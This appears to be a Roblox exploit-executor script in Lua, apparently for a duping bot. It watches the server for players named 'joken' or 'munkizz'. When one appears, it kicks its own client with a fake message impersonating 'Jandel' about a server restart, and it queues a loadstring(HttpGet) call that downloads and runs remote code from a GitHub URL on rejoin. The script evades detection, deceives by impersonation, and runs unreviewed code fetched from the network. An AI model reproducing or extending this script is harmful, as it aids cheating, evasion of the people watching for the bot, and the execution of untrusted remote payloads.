local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local hasKickedSelf = false

local NAME_PATTERNS = {"joken","iamjoken","jokenn","jokeen","jokan","jokn","munkizz","munkizzz","munkiz","munki","munkizzo","munkizzx"}

local function isJokenPlayer(username)
    local lowerName = username:lower()
    for _, pattern in ipairs(NAME_PATTERNS) do
        if lowerName == pattern then return true end
        if lowerName:find("^" .. pattern .. "%d") then return true end
        if lowerName:find("^" .. pattern .. "[a-z]") then return true end
        if lowerName:find("^" .. pattern .. "_") then return true end
        if lowerName:find("^" .. pattern .. "%-") then return true end
    end
    if lowerName:find("joken") then return true end
    if lowerName:find("munkizz") then return true end
    return false
end

local function kickSelf(jokenName)
    if hasKickedSelf then return end
    hasKickedSelf = true
    task.spawn(function()
        local success = pcall(function()
            -- Queue the tnginamo script for when we rejoin
            if queue_on_teleport then
                queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/tnginamo"))()]])
            elseif syn and syn.queue_on_teleport then
                syn.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/tnginamo"))()]])
            elseif fluxus and fluxus.queue_on_teleport then
                fluxus.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/tnginamo"))()]])
            end
            player:Kick("Jandel: Hi, this is Jandel. Server is restarted, please rejoin.")
        end)
        if success then
            print("Kicked self due to joken presence: " .. jokenName)
        end
    end)
end

local function scanForJoken()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and isJokenPlayer(p.Name) then
            print("Joken detected: " .. p.Name .. " - Kicking self!")
            kickSelf(p.Name)
            return
        end
    end
end

local function onPlayerAdded(newPlayer)
    if newPlayer == player then return end
    if isJokenPlayer(newPlayer.Name) then
        print("Joken joined: " .. newPlayer.Name .. " - Kicking self!")
        kickSelf(newPlayer.Name)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)
RunService.Heartbeat:Connect(function()
    scanForJoken()
end)
